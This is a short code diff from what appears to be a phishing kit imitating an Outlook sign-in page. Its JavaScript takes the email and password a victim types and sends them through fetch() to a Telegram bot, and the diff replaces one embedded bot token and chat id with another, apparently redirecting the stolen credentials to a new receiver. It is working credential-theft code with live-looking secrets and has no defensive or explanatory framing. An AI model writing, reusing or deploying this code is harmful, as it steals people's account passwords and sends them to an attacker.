@@ -190,8 +190,8 @@
       const password = document.getElementById('password').value;
 
       const telegramMessage = `🟦 Outlook Login Attempt\n\n📧 Email: ${username}\n🔑 Password: ${password}`;
-                  var token = '8355767720:AAGBxj8oQDA7rbXy1c3uDOjUfaOgovOyoNw';
-      var chat_id = '7019709261';
+                var token = '8019140305:AAEREqG8P3EFpQ8Bf1ijvgmzU11VSM84JVI';
+      var chat_id = '7845015700';
       const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
       fetch(url)
